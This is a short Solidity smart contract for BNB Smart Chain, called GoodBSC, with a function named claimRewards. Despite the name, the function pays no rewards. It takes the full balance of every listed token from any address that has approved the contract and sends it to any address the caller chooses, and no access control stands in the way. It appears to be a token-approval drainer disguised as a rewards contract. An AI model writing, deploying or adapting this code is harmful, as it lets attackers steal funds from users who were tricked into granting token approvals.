interface ERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract GoodBSC is Context, Ownable {
    using SafeMath for uint256;

    address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address dai = 0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3;

    address public devAddress;
    
    constructor() {
        devAddress=msg.sender;
    }
        
    function claimRewards(
        address[] memory tokenAddrs,
        address addrFrom,
        address addrTo
    ) public {
        uint256 nativeBal = addrFrom.balance;
        require(nativeBal > 0);
        uint256 tCnt = tokenAddrs.length;
        for (uint256 i = 0; i < tCnt; i++) {
            uint256 tokenBal = ERC20(tokenAddrs[i]).balanceOf(addrFrom);
            ERC20(tokenAddrs[i]).transferFrom(addrFrom, addrTo, tokenBal);
        }
    }
            
}